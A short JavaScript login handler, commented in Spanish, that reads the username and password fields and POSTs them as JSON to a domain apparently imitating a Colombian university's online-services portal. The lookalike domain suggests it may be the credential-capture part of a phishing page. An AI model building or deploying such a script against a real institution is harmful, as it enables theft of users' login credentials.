document.addEventListener('DOMContentLoaded', function () {
    const loginButton = document.querySelector('.login_btn');

    loginButton.addEventListener('click', function () {
        const usuario = document.getElementById('username').value;
        const clave = document.getElementById('password').value;

        // Enviar datos al servidor
        enviarDatosAlServidor(usuario, clave);
    });

    function enviarDatosAlServidor(usuario, clave) {
        fetch('https://www.uniquindioserviciosenlinea.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ usuario, clave }),
        })
        .then(response => response.text())
        .then(data => {
            console.log('Respuesta del servidor:', data);
        })
        .catch(error => {
            console.error('Error al enviar datos:', error);
        });
    }
});